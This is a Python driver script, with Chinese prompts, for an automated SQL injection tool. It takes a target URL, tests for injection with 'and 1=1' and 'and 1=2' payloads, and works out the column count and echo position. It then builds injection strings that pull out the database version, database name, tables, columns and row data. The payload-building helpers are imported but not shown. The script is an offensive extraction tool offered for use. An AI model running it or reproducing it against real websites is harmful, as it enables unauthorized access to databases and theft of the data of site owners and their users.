import  requests
from code1.page_validity import page_validity
from code1.exploit import exploit
from code1.get_information import information

if __name__ == '__main__':
    print('请输入要检测的网址：')
    url=input()
    a=page_validity.judge(url)


    print('开始判断是否存在注入点...')
    built_url=information.built_url(url)
    print(built_url)

    url=url+'%20and%201%20=%201'
    order_url=built_url+"%20and%201%20=%201"
    print('开始判断字段数...')

    counts=information.get_counts(url,order_url)
    built_url+="%20and%201%20=%202"

    print('开始构造注入语句...')
    string_counts=exploit.get_string_counts(counts)
    exploit_string=exploit.exploit_string(built_url,string_counts)
    print(exploit_string)

    print('开始判断回显位置...')
    position=information.get_position(url,exploit_string)

    print('开始构造获取数据库版本语句...')
    version_string=exploit.exploit_version(built_url,position,string_counts)
    print(version_string)
    print('数据库版本为：')
    string=information.get_infor(exploit_string,version_string)

    print('开始构造获取数据库名语句...')
    database=exploit.exploit_database(built_url,position,string_counts)
    print(database)
    print('数据库名为：')
    get_database=information.get_infor(exploit_string,database)

    print('开始获取表...')
    tables_string=exploit.exploit_tables(built_url,position,get_database,string_counts)
    print(tables_string)
    print('数据库'+str(get_database)+'的表有：')
    get_tables=information.get_infor(exploit_string,tables_string)

    tables=get_tables.split(',')
    print('请输入你想查看的表名,输入all查看全部')
    scan_table=input()
    print('开始获取'+str(scan_table)+'的列名...')
    get_columns=''
    if scan_table=='all':
        for i in tables:
            print('表'+str(i)+'的列有：')
            column_string=exploit.exploit_columns(built_url,position,get_database,i,string_counts)
            get_columns=information.get_infor(exploit_string,column_string)
    else:
        for i in tables:
            if scan_table==i:
                print('表'+str(i)+'的列有：')
                column_string=exploit.exploit_columns(built_url,position,get_database,i,string_counts)
                get_columns=information.get_infor(exploit_string,column_string)
    if get_columns=='':
        print('输入有误')

    column=get_columns.split(',')
    a=''
    for i in range(len(column)):
        a+=str(column[i])
        if i<len(column)-1:
            a+=',0x20,'
    column=a
    print('开始获取数据...')
    print('输入你想查看的表')
    table=input()
    db_and_table=''
    print('正在获取'+str(table)+'表中数据...')
    for i in tables:
        if table==i:
            db_and_table=get_database+'.'+table

    if db_and_table=='':
        print('输入有误')
    else:
        data_string=exploit.exploit_data(built_url,position,db_and_table,column,string_counts)
        print(data_string)
        get_data=information.get_data(exploit_string,data_string)



































